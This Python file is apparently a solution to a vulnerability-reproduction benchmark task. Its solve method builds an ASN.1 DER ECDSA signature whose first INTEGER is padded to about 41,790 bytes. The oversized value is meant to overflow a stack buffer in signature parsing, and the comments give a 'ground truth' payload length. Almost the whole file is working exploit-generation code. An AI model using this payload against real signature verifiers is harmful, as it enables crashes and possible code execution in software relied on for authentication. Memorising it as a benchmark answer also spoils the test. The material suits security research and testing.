import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in ECDSA ASN.1 parsing.
        The vulnerability allows an attacker to overflow a stack buffer by providing an excessively
        large ASN.1 INTEGER within the ECDSA signature SEQUENCE.
        """
        
        def encode_asn1_length(length: int) -> bytes:
            """Encode length according to ASN.1 DER rules."""
            if length < 128:
                return bytes([length])
            else:
                length_bytes = b''
                temp = length
                while temp > 0:
                    length_bytes = bytes([temp & 0xFF]) + length_bytes
                    temp >>= 8
                return bytes([0x80 | len(length_bytes)]) + length_bytes

        # Ground truth length is 41798 bytes.
        # We aim to construct an ASN.1 SEQUENCE { INTEGER r, INTEGER s }
        # where 'r' is very large, causing the stack buffer overflow during parsing/copying.
        
        # Estimated overhead for ASN.1 tags and lengths is small (< 20 bytes).
        # We construct a large integer of roughly 41790 bytes.
        large_int_size = 41790
        
        # 1. Construct the large INTEGER 'r'
        # Using 0x41 ('A') as content. Since 0x41 < 0x80, the first byte is positive, 
        # so no leading zero padding is strictly required by DER for positivity, 
        # and it's a valid integer value.
        r_value = b'\x41' * large_int_size
        r_tag = b'\x02'
        r_length_bytes = encode_asn1_length(len(r_value))
        r_encoded = r_tag + r_length_bytes + r_value
        
        # 2. Construct the small INTEGER 's' (valid value 1)
        s_value = b'\x01'
        s_tag = b'\x02'
        s_length_bytes = encode_asn1_length(len(s_value))
        s_encoded = s_tag + s_length_bytes + s_value
        
        # 3. Construct the SEQUENCE
        seq_content = r_encoded + s_encoded
        seq_tag = b'\x30'
        seq_length_bytes = encode_asn1_length(len(seq_content))
        
        poc = seq_tag + seq_length_bytes + seq_content
        
        return poc